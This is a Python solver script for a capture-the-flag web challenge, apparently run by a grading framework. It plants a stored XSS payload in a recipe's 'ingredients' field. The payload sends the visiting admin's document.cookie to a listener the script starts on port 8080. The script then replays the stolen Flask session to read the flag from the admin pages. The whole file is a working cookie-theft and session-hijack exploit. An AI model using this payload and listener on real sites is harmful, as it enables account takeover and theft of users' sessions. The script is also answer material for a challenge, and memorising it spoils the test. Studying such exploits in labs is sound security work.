#!/usr/bin/env python3

from http.cookies import SimpleCookie
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import queue
import re
import sys
import threading
from urllib.parse import parse_qs, urlsplit

import requests

if len(sys.argv) < 2:
    URL = "http://challenge:5000"
else:
    URL = sys.argv[1].rstrip("/")


captured_cookies = queue.Queue(maxsize=1)


class CaptureHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        cookie_values = parse_qs(urlsplit(self.path).query).get("c", [])
        if cookie_values and captured_cookies.empty():
            captured_cookies.put_nowait(cookie_values[0])
        self.send_response(204)
        self.end_headers()

    def log_message(self, format, *args):
        pass


capture_server = ThreadingHTTPServer(("0.0.0.0", 8080), CaptureHandler)
capture_thread = threading.Thread(target=capture_server.serve_forever, daemon=True)
capture_thread.start()

# Create the XSS payload to steal the cookie
payload = (
    '<script>location="http://solver:8080/?c="+'
    "encodeURIComponent(document.cookie)</script>"
)

ses = requests.session()

try:
    # Create a cookie with the XSS payload as the ingredients.
    res = ses.post(URL + "/cookie/new", data={"name": "hello", "ingredients": payload})
    res.raise_for_status()
    cid = res.url.rstrip("/").rsplit("/", 1)[-1]
    print(f"[+] Stored XSS payload in cookie ID {cid}")

    # Submit the XSS to the admin.
    res = ses.post(URL + "/approve", data={"cookie": cid})
    res.raise_for_status()
    print("[+] Admin is visiting XSS payload")

    try:
        cookie_header = captured_cookies.get(timeout=20)
    except queue.Empty as error:
        raise RuntimeError("admin browser did not send its session cookie") from error
finally:
    capture_server.shutdown()
    capture_server.server_close()
    capture_thread.join()

print(f'[+] Stole cookie: "{cookie_header}"')
cookies = SimpleCookie()
cookies.load(cookie_header)
if "session" not in cookies:
    raise RuntimeError("admin browser did not return the Flask session cookie")

admin_session = {"session": cookies["session"].value}

# Get the flag cookie from the admin page
res = requests.get(URL + "/admin", cookies=admin_session)
res.raise_for_status()
flag_cid = re.search(r'/cookie/([\w-]+)">Flag Cookie', res.text)[1]
print(f'[+] Flag cookie ID: "{flag_cid}"')

# Read the flag from the flag cookie page
res = requests.get(URL + "/cookie/" + flag_cid, cookies=admin_session)
res.raise_for_status()
flag = re.search("<p>2. Add one (.+?)</p><p>", res.text).group(1)
print(f'[+] Captured flag: "{flag}"')

# Write the flag out to where the framework will read it.
with open("flag", "w", encoding="utf-8") as f:
    f.write(flag)
